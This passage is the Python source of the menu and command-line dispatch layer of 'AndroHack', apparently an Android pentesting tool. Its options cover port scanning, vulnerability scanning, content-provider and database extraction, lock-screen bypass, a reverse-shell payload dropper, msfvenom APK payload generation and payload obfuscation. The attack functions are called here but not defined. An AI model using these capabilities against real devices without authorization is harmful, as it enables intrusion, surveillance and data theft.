                "severity": vuln.get("severity", "MEDIUM"),
                "detail": vuln.get("detail", ""),
                "cve": vuln.get("cve"),
            })
        _SESSION["permissions"].extend(data.get("dangerous_permissions", []))
        _SESSION["secrets"].extend(data.get("secrets", []))
        _SESSION["urls"].extend(data.get("urls", []))

def _get_session() -> dict:
    return _SESSION.copy()

# ==================== MODULE HANDLERS ====================
def handle_device_manager():
    console.rule("[bold magenta]📱 Device Manager[/]")
    check_adb()
    device_id = select_device()
    if not device_id:
        return
    device_info(device_id)

def handle_apk_analyzer():
    console.rule("[bold magenta]🔎 APK Static Analyzer[/]")
    apk_path = Prompt.ask("[cyan]APK file path[/]")
    findings = analyze_apk(apk_path)
    if Confirm.ask("[cyan]Save findings to report?[/]", default=True):
        _save_to_session(findings, "apk_analysis")
        console.print("[green]✓ Added to session report.[/]")

def handle_network_scanner():
    console.rule("[bold magenta]🌐 Network Scanner[/]")
    choice = Prompt.ask("[cyan]Scan mode[/]", choices=["device", "host", "wifi", "discover", "mitm"], default="device")

    if choice == "device":
        device_id = select_device()
        if not device_id:
            return
        ip = get_device_ip(device_id)
        if ip:
            console.print(f"[green]Device IP:[/] {ip}")
            port_scan(ip)
        else:
            console.print("[red]Could not determine device IP.[/]")

    elif choice == "host":
        target = Prompt.ask("[cyan]Target IP/hostname[/]")
        port_range = Prompt.ask("[cyan]Port range (comma-list or 'all')[/]", default="common")
        if port_range == "all":
            ports = list(range(1, 65536))
        elif port_range == "common":
            ports = None
        else:
            ports = [int(p.strip()) for p in port_range.split(",") if p.strip().isdigit()]
        port_scan(target, ports)

    elif choice == "wifi":
        device_id = select_device()
        if device_id:
            get_wifi_info(device_id)

    elif choice == "discover":
        subnet = Prompt.ask("[cyan]Subnet (e.g. 192.168.1)[/]")
        discover_devices(subnet)

    elif choice == "mitm":
        mitm_setup_guide()

def handle_vulnerability_scanner():
    console.rule("[bold magenta]🚨 Vulnerability Scanner[/]")
    device_id = select_device()
    if not device_id:
        return
    pkg = Prompt.ask("[cyan]Target package (leave blank for device-level only)[/]", default="")
    report = full_vulnerability_scan(device_id, pkg or None)
    _save_to_session(report, "vulnerability_scan")

def handle_exploit_engine():
    console.rule("[bold magenta]💥 Exploit Engine[/]")
    device_id = select_device()
    if not device_id:
        return

    exploit_menu(device_id)
    choice = Prompt.ask("[red]Select exploit[/]", choices=[str(i) for i in range(10)])

    if choice == "1":
        pkg  = Prompt.ask("[cyan]Package name[/]")
        act  = Prompt.ask("[cyan]Activity class[/]")
        launch_exported_activity(device_id, pkg, act)

    elif choice == "2":
        pkg    = Prompt.ask("[cyan]Package name[/]")
        action = Prompt.ask("[cyan]Intent action[/]")
        trigger_broadcast_receiver(device_id, pkg, action)

    elif choice == "3":
        uri = Prompt.ask("[cyan]Content provider URI (content://...)[/]")
        extract_content_provider(device_id, uri)

    elif choice == "4":
        pkg    = Prompt.ask("[cyan]Package name[/]")
        scheme = Prompt.ask("[cyan]Deep link scheme (e.g. myapp)[/]")
        deep_link_fuzzer(device_id, pkg, scheme)

    elif choice == "5":
        pkg = Prompt.ask("[cyan]Package name[/]")
        frida_injection_guide(pkg)

    elif choice == "6":
        lhost = Prompt.ask("[cyan]LHOST[/]")
        lport = IntPrompt.ask("[cyan]LPORT[/]", default=4444)
        shell_payload_dropper(device_id, lhost, lport)

    elif choice == "7":
        pkg  = Prompt.ask("[cyan]Package name[/]")
        db   = Prompt.ask("[cyan]Database filename[/]")
        extract_database(device_id, pkg, db)

    elif choice == "8":
        bypass_lock_screen(device_id)

    elif choice == "9":
        enable_developer_options(device_id)

def handle_payload_generator():
    console.rule("[bold magenta]🎯 Payload Generator[/]")
    payload_menu()
    choice = Prompt.ask("[red]Select payload type[/]", choices=["1", "2", "3", "4", "5", "0"])

    if choice == "1":
        lhost  = Prompt.ask("[cyan]LHOST[/]")
        lport  = IntPrompt.ask("[cyan]LPORT[/]", default=4444)
        ptype  = Prompt.ask("[cyan]Payload type[/]",
                             choices=["reverse_tcp", "reverse_https", "reverse_http", "shell_tcp"],
                             default="reverse_tcp")
        output = Prompt.ask("[cyan]Output file[/]", default="payload.apk")
        generate_msfvenom_apk(lhost, lport, ptype, output)

    elif choice == "2":
        action = Prompt.ask("[cyan]Intent action[/]")
        comp   = Prompt.ask("[cyan]Component (pkg/class or blank)[/]", default="")
        data   = Prompt.ask("[cyan]Data URI (or blank)[/]", default="")
        generate_intent_payload(action, comp or None, data or None)

    elif choice == "3":
        lhost = Prompt.ask("[cyan]LHOST[/]")
        lport = IntPrompt.ask("[cyan]LPORT[/]", default=4444)
        generate_reverse_shell_commands(lhost, lport)

    elif choice == "4":
        lhost  = Prompt.ask("[cyan]LHOST[/]")
        lport  = IntPrompt.ask("[cyan]LPORT[/]", default=4444)
        output = Prompt.ask("[cyan]Script filename[/]", default="adb_payload.sh")
        generate_adb_payload_script(None, lhost, lport, output)

    elif choice == "5":
        raw   = Prompt.ask("[cyan]Payload to obfuscate[/]")
        method = Prompt.ask("[cyan]Obfuscation method[/]", choices=["base64", "hex"], default="base64")
        obfuscate_payload(raw, method)

def handle_report_generator():
    console.rule("[bold magenta]📋 Report Generator[/]")
    target = Prompt.ask("[cyan]Target description (app/device name)[/]", default="Unknown Target")

    data = _get_session()
    data["target"] = target

    fmt = Prompt.ask("[cyan]Report format[/]", choices=["html", "json", "both", "table"], default="html")

    if fmt in ("html", "both"):
        out = Prompt.ask("[cyan]HTML output filename[/]", default="androhack_report.html")
        generate_html_report(data, out)

    if fmt in ("json", "both"):
        out = Prompt.ask("[cyan]JSON output filename[/]", default="androhack_report.json")
        generate_json_report(data, out)

    if fmt == "table":
        print_summary_table(data)

def handle_adb_wifi():
    console.rule("[bold magenta]📡 ADB WiFi Connect[/]")
    device_id = select_device()
    if not device_id:
        return
    port = IntPrompt.ask("[cyan]Port[/]", default=5555)
    enable_adb_wifi(device_id, port)

def handle_auto_adb_wifi():
    console.rule("[bold magenta]⚡ Auto ADB WiFi Connect[/]")
    device_id = select_device()
    if not device_id:
        return
    auto_adb_wifi_connect(device_id, 5555)

def handle_screenshot():
    console.rule("[bold magenta]📸 Screenshot Capture[/]")
    device_id = select_device()
    if not device_id:
        return
    path = take_screenshot(device_id)
    if path:
        console.print(f"[bold green]✓ Screenshot saved:[/] {path}")

def handle_package_manager():
    console.rule("[bold magenta]📦 Package Manager[/]")
    device_id = select_device()
    if not device_id:
        return
    pkg_type = Prompt.ask("[cyan]Package filter[/]",
                           choices=["all", "system", "third_party", "disabled"],
                           default="third_party")
    list_packages(device_id, pkg_type)

def handle_logcat():
    console.rule("[bold magenta]🐛 Logcat Analyzer[/]")
    device_id = select_device()
    if not device_id:
        return
    lines = IntPrompt.ask("[cyan]Lines to capture[/]", default=300)
    capture_logcat(device_id, lines)

def handle_ssl_check():
    console.rule("[bold magenta]🔐 SSL Pinning Check[/]")
    device_id = select_device()
    if not device_id:
        return
    pkg = Prompt.ask("[cyan]Package name[/]")
    check_ssl_pinning(device_id, pkg)

def handle_file_transfer():
    console.rule("[bold magenta]📂 File Transfer[/]")
    device_id = select_device()
    if not device_id:
        return
    direction = Prompt.ask("[cyan]Direction[/]", choices=["pull", "push"])
    if direction == "pull":
        remote = Prompt.ask("[cyan]Remote path (on device)[/]")
        local  = Prompt.ask("[cyan]Local destination[/]", default=".")
        pull_file(device_id, remote, local)
    else:
        local  = Prompt.ask("[cyan]Local file path[/]")
        remote = Prompt.ask("[cyan]Remote destination (on device)[/]")
        push_file(device_id, local, remote)

def handle_adb_shell():
    console.rule("[bold magenta]💻 Interactive ADB Shell[/]")
    device_id = select_device()
    if not device_id:
        return
    interactive_shell(device_id)

def handle_utilities():
    """Placeholder for utilities module."""
    console.rule("[bold magenta]🔧 Utilities[/]")
    console.print("[yellow]Utilities module is not yet implemented.[/]")

def check_scrcpy() -> bool:
    """Check whether scrcpy is available on PATH."""
    if shutil.which("scrcpy"):
        return True
    console.print("[bold red]scrcpy not found.[/] Install it with: [bold cyan]pkg install scrcpy[/]")
    return False

def open_remote_screen(device_id: str) -> bool:
    """Launch scrcpy for the selected Android device."""
    cmd = [
        "scrcpy",
        "-s", device_id,
        "--window-title", "Remote Screen",
        "--max-size", "900",
    ]
    try:
        subprocess.Popen(cmd)
        console.print("[bold green]Remote Screen launched.[/]")
        return True
    except FileNotFoundError:
        console.print("[bold red]scrcpy not found.[/] Install it with: [bold cyan]pkg install scrcpy[/]")
    except OSError as exc:
        console.print(f"[bold red]Failed to launch Remote Screen:[/] {exc}")
    return False

def handle_remote_control():
    while True:
        console.print()
        show_remote_control_menu()
        valid_choices = [num for num, *_ in REMOTE_CONTROL_OPTIONS]
        choice = Prompt.ask("\n[bold cyan]Remote Control ▶[/]", choices=valid_choices, show_choices=False)

        if choice == "0":
            return

        if choice == "1":
            if not check_scrcpy():
                continue
            device_id = select_device()
            if not device_id:
                continue
            open_remote_screen(device_id)
            continue

        console.print("[yellow]This feature is not ready yet.[/]")

def handle_about():
    show_about()

# ==================== INTERACTIVE MODE ====================
HANDLER_MAP = {
    "1":  handle_device_manager,
    "2":  handle_apk_analyzer,
    "3":  handle_network_scanner,
    "4":  handle_vulnerability_scanner,
    "5":  handle_exploit_engine,
    "6":  handle_payload_generator,
    "7":  handle_report_generator,
    "8":  handle_adb_wifi,
    "9":  handle_auto_adb_wifi,
    "10": handle_screenshot,
    "11": handle_package_manager,
    "12": handle_logcat,
    "13": handle_ssl_check,
    "14": handle_file_transfer,
    "15": handle_adb_shell,
    "16": handle_remote_control,
    "17": handle_utilities,
    "18": handle_about,
}

def select_device() -> str:
    """Select a connected device; return its serial."""
    devices = list_devices(print_output=True)
    if not devices:
        return None
    if len(devices) == 1:
        dev = devices[0]["serial"]
        console.print(f"[green]Auto-selected device:[/] {dev}")
        return dev
    serial = Prompt.ask("[cyan]Enter device serial[/]")
    return serial

def interactive_mode():
    """Main interactive loop."""
    show_intro_loading()
    show_banner()
    show_status()
    show_author_info()
    show_legal_disclaimer()

    if not Confirm.ask("\n[bold red]I confirm I have authorization to test the target system[/]", default=False):
        console.print("[yellow]Exiting. Obtain proper authorization before testing.[/]")
        sys.exit(0)

    while True:
        clear_screen()
        show_banner()
        show_status()
        show_author_info()
        # Disclaimer only shown once above

        console.print()
        show_main_menu()
        valid_choices = [num for num, *_ in MENU_OPTIONS] + ["help", "guide"]
        choice = Prompt.ask("\n[bold cyan]AndroHack ▶[/]", choices=valid_choices, show_choices=False)

        if choice == "0":
            console.print("\n[bold magenta]👻 Exiting AndroHack. Stay ethical.[/]\n")
            sys.exit(0)

        if choice == "help":
            clear_screen()
            show_banner()
            show_status()
            show_author_info()
            show_help_menu()
            Prompt.ask("[dim]Press ENTER to return to menu[/]", default="")
            continue

        if choice == "guide":
            clear_screen()
            show_banner()
            show_status()
            show_author_info()
            show_guide()
            Prompt.ask("[dim]Press ENTER to return to menu[/]", default="")
            continue

        handler = HANDLER_MAP.get(choice)
        if handler:
            try:
                console.print()
                handler()
            except KeyboardInterrupt:
                console.print("\n[yellow]↩ Returned to main menu.[/]")
            except Exception as e:
                console.print(f"\n[bold red]✗ Error:[/] {e}")
        else:
            console.print("[red]Invalid option.[/]")

        console.print()
        Prompt.ask("[dim]Press ENTER to continue[/]", default="")

# ==================== CLI MODE ====================
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="androhack",
        description=f"👻 AndroHack v{VERSION} — Advanced Android Pentesting Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Author : {AUTHOR}
Website: {WEBSITE}
Github : {GITHUB}

Examples:
  python3 androhack.py --interactive
  python3 androhack.py --apk app.apk --report html
  python3 androhack.py --device ABC123 --vuln-scan --pkg com.example.app
  python3 androhack.py --device ABC123 --port-scan
  python3 androhack.py --payload reverse_tcp --lhost 10.0.0.1 --lport 4444
  python3 androhack.py --device ABC123 --exploit deep-link --pkg com.example --scheme myapp
  python3 androhack.py --devices
        """
    )

    p.add_argument("--interactive", "-i", action="store_true", help="Launch interactive menu mode")
    p.add_argument("--version", "-v", action="store_true", help="Show version")

    dg = p.add_argument_group("Device")
    dg.add_argument("--devices", action="store_true", help="List connected devices")
    dg.add_argument("--device", "-d", metavar="SERIAL", help="Target device serial number")
    dg.add_argument("--info", action="store_true", help="Show device info")
    dg.add_argument("--shell", metavar="CMD", help="Run ADB shell command")
    dg.add_argument("--adb-shell", action="store_true", help="Drop into interactive ADB shell")
    dg.add_argument("--adb-wifi", action="store_true", help="Enable ADB over WiFi")
    dg.add_argument("--screenshot", action="store_true", help="Capture device screenshot")
    dg.add_argument("--logcat", metavar="N", type=int, help="Capture N lines of logcat", nargs="?", const=200)
    dg.add_argument("--packages", choices=["all","system","third_party","disabled"], help="List installed packages")
    dg.add_argument("--pull", metavar="REMOTE", help="Pull file from device")
    dg.add_argument("--push", nargs=2, metavar=("LOCAL","REMOTE"), help="Push file to device")

    ag = p.add_argument_group("APK Analysis")
    ag.add_argument("--apk", metavar="FILE", help="APK file to analyze")

    ng = p.add_argument_group("Network")
    ng.add_argument("--port-scan", action="store_true", help="Port scan device IP")
    ng.add_argument("--target", metavar="IP", help="Explicit scan target IP")
    ng.add_argument("--ports", metavar="PORTS", help="Comma-separated ports or 'all'")
    ng.add_argument("--wifi-info", action="store_true", help="Show WiFi info")
    ng.add_argument("--discover", metavar="SUBNET", help="Discover hosts on subnet")
    ng.add_argument("--ssl-pinning", metavar="PKG", help="Check SSL pinning for package")
    ng.add_argument("--mitm-guide", action="store_true", help="Show MitM setup guide")

    vg = p.add_argument_group("Vulnerability")
    vg.add_argument("--vuln-scan", action="store_true", help="Run full vulnerability scan")
    vg.add_argument("--pkg", metavar="PKG", help="Target package name")
    vg.add_argument("--cve-check", action="store_true", help="Check Android CVEs for device")
    vg.add_argument("--root-check", action="store_true", help="Check if device is rooted")

    eg = p.add_argument_group("Exploit")
    eg.add_argument("--exploit", metavar="MODULE",
                    choices=["activity","broadcast","provider","deep-link","frida","shell-drop","db-extract","lock-bypass","dev-options"],
                    help="Exploit module to run")
    eg.add_argument("--activity", metavar="CLASS", help="Activity class for --exploit activity")
    eg.add_argument("--action", metavar="ACTION", help="Intent action")
    eg.add_argument("--uri", metavar="URI", help="URI for content provider / deep link")
    eg.add_argument("--scheme", metavar="SCHEME", help="Deep link scheme")
    eg.add_argument("--lhost", metavar="IP", help="Listener host")
    eg.add_argument("--lport", metavar="PORT", type=int, default=4444, help="Listener port")
    eg.add_argument("--db-name", metavar="DB", help="Database filename to extract")

    pg = p.add_argument_group("Payload")
    pg.add_argument("--payload", metavar="TYPE",
                    choices=["reverse_tcp","reverse_https","reverse_http","shell_tcp",
                             "intent","reverse-shells","adb-script","obfuscate"],
                    help="Generate a payload")
    pg.add_argument("--payload-out", metavar="FILE", help="Output file for payload")
    pg.add_argument("--obfuscate-method", choices=["base64","hex"], default="base64", help="Obfuscation method")
    pg.add_argument("--raw-payload", metavar="CMD", help="Payload string to obfuscate")

    rg = p.add_argument_group("Report")
    rg.add_argument("--report", choices=["html","json","both","table"], help="Generate report after scan")
    rg.add_argument("--report-out", metavar="FILE", help="Report output filename")
    rg.add_argument("--target-name", metavar="NAME", help="Target name for report", default="Unknown Target")

    return p

def cli_mode(args):
    """Run CLI operations based on parsed arguments."""
    show_banner()
    show_status()
    show_author_info()

    device_id = args.device
    apk_data = {}

    if args.version:
        console.print(f"[bold magenta]{TOOL_NAME}[/] v[bold cyan]{VERSION}[/] by [bold]{AUTHOR}[/]")
        return

    if args.devices:
        check_adb()
        list_devices()

    if args.info and device_id:
        device_info(device_id)

    if args.shell and device_id:
        shell_cmd(device_id, args.shell)

    if args.adb_shell and device_id:
        interactive_shell(device_id)

    if args.adb_wifi and device_id:
        enable_adb_wifi(device_id, args.lport)

    if args.screenshot and device_id:
        take_screenshot(device_id)

    if args.logcat is not None and device_id:
        capture_logcat(device_id, args.logcat)

    if args.packages and device_id:
        list_packages(device_id, args.packages)

    if args.pull and device_id:
        pull_file(device_id, args.pull)

    if args.push and device_id:
        push_file(device_id, args.push[0], args.push[1])

    if args.apk:
        apk_data = analyze_apk(args.apk)
        _save_to_session(apk_data, "apk")

    if args.port_scan:
        target = args.target
        if not target and device_id:
            target = get_device_ip(device_id)
        if target:
            ports = None
            if args.ports == "all":
                ports = list(range(1, 65536))
            elif args.ports:
                ports = [int(p) for p in args.ports.split(",") if p.strip().isdigit()]
            port_scan(target, ports)
        else:
            console.print("[red]Provide --target or --device for port scan.[/]")

    if args.wifi_info and device_id:
        get_wifi_info(device_id)

    if args.discover:
        discover_devices(args.discover)

    if args.ssl_pinning and device_id:
        check_ssl_pinning(device_id, args.ssl_pinning)

    if args.mitm_guide:
        mitm_setup_guide()

    if args.vuln_scan and device_id:
        report = full_vulnerability_scan(device_id, args.pkg)
        _save_to_session(report, "vuln")

    if args.cve_check and device_id:
        findings = check_android_version_cves(device_id)
        _save_to_session({"cves": findings}, "cve")

    if args.root_check and device_id:
        check_root_status(device_id)

    if args.exploit and device_id:
        ex = args.exploit
        if ex == "activity":
            launch_exported_activity(device_id, args.pkg, args.activity)
        elif ex == "broadcast":
            trigger_broadcast_receiver(device_id, args.pkg, args.action)
        elif ex == "provider":
            extract_content_provider(device_id, args.uri)
        elif ex == "deep-link":
            deep_link_fuzzer(device_id, args.pkg, args.scheme)
        elif ex == "frida":
            frida_injection_guide(args.pkg)
        elif ex == "shell-drop":
            shell_payload_dropper(device_id, args.lhost, args.lport)
        elif ex == "db-extract":
            extract_database(device_id, args.pkg, args.db_name)
        elif ex == "lock-bypass":
            bypass_lock_screen(device_id)
        elif ex == "dev-options":
            enable_developer_options(device_id)

    if args.payload:
        out = args.payload_out
        if args.payload in ("reverse_tcp","reverse_https","reverse_http","shell_tcp"):
            generate_msfvenom_apk(args.lhost, args.lport, args.payload, out or "payload.apk")
        elif args.payload == "intent":
            generate_intent_payload(args.action, args.pkg, args.uri)
        elif args.payload == "reverse-shells":
            generate_reverse_shell_commands(args.lhost, args.lport)
        elif args.payload == "adb-script":
            generate_adb_payload_script(device_id, args.lhost, args.lport, out or "adb_payload.sh")
        elif args.payload == "obfuscate":
            obfuscate_payload(args.raw_payload or "", args.obfuscate_method)

    if args.report:
        data = _get_session()
        data["target"] = args.target_name
        if apk_data:
            data.update(apk_data)
        if args.report in ("html", "both"):
            out = args.report_out or "androhack_report.html"
            generate_html_report(data, out)
        if args.report in ("json", "both"):
            out = args.report_out or "androhack_report.json"
            generate_json_report(data, out)
        if args.report == "table":
            print_summary_table(data)

# ==================== ENTRY POINT ====================
def main():
    parser = build_parser()

    if len(sys.argv) == 1:
        interactive_mode()
        return

    args = parser.parse_args()

    if args.interactive:
        interactive_mode()
    else:
        cli_mode(args)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n\n[bold magenta]👻 AndroHack interrupted. Stay ethical.[/]\n")
        sys.exit(0)